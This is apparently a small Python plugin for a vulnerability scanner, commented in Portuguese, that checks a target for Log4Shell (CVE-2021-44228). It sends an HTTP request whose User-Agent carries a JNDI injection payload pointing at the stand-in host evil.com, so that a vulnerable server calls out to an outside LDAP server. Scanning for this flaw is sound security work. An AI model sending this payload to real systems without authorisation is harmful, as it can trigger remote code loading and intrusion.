# plugins/cve_2021_44228_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner simplificado para a vulnerabilidade Log4Shell (CVE-2021-44228).
    Envia um payload no User-Agent e recomenda checar logs/out-of-band.
    """
    import requests

    headers = {
        "User-Agent": "${jndi:ldap://evil.com/a}"
    }

    resultado = {}
    try:
        url = f"http://{target}"
        r = requests.get(url, headers=headers, timeout=6)
        resultado = {
            "mensagem": "Payload enviado. Verifique seu monitor OOB (out-of-band) ou logs do alvo.",
            "status_http": r.status_code
        }
    except Exception as e:
        resultado = {"erro": str(e)}

    return {"plugin": "cve_2021_44228_scanner", "resultados": resultado}
